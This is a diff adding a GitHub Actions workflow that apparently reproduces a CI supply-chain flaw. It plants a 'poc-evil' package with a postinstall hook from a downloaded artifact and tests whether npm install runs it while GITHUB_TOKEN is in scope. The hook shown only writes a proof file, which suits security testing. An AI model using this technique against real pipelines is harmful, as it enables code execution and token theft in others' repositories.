@@ -1,0 +1,54 @@
+name: probe-repro
+on:
+  workflow_dispatch:
+
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      GITHUB_REPOSITORY: ${{ github.repository }}
+      LINTER_REPORT_PATH: ./linter-report.txt
+      PR_NUMBER_PATH: ./pr-number.txt
+    steps:
+      - name: download artifact exactly
+        run: |
+          set -x
+          curl -sL --max-time 30 -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/PDFtoMark/gab-poc-adp-linter/actions/artifacts/13024360810/zip" -o /tmp/art.zip
+          ls -la /tmp/art.zip
+          unzip -o /tmp/art.zip -d "$GITHUB_WORKSPACE"
+          ls -la "$GITHUB_WORKSPACE"
+          ls -la "$GITHUB_WORKSPACE/poc-evil"
+          cat "$GITHUB_WORKSPACE/package.json"
+
+      - name: run exact vulnerable step
+        run: |
+          set +e
+          echo "npm=$(npm -v) node=$(node -v)"
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | tail -20
+          echo "install exit=$?"
+          ls -la poc-evil/ | head
+          echo "--- npm install-scripts ls:"
+          npm install-scripts ls 2>&1 | head -20
+          node node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js 2>&1 | head -5
+
+      - name: control inline with GITHUB_TOKEN env
+        run: |
+          set +e
+          d=/tmp/c1; rm -rf "$d"; mkdir -p "$d/poc-evil"
+          printf '{"name":"r","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}\n' > "$d/package.json"
+          printf '{"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}\n' > "$d/poc-evil/package.json"
+          printf "console.log('HOOK-RAN token=' + !!process.env.GITHUB_TOKEN)\nrequire('fs').writeFileSync('%s/RAN.txt','ran')\n" "$d" > "$d/poc-evil/hook.js"
+          ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | tail -8 )
+          if [ -f "$d/RAN.txt" ]; then echo "CONTROL => RAN"; else echo "CONTROL => NOT-RAN"; fi
+
+      - name: control exact artifact inline in tmp
+        run: |
+          set +e
+          d=/tmp/c2; rm -rf "$d"; mkdir -p "$d/poc-evil"
+          printf '{"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}\n' > "$d/package.json"
+          printf '{"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}\n' > "$d/poc-evil/package.json"
+          unzip -p /tmp/art.zip poc-evil/hook.js > "$d/poc-evil/hook.js"
+          ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | tail -12 )
+          if [ -f "$d/poc-evil/rce-proof.txt" ]; then echo "ARTIFACT-INLINE => RAN"; else echo "ARTIFACT-INLINE => NOT-RAN"; fi
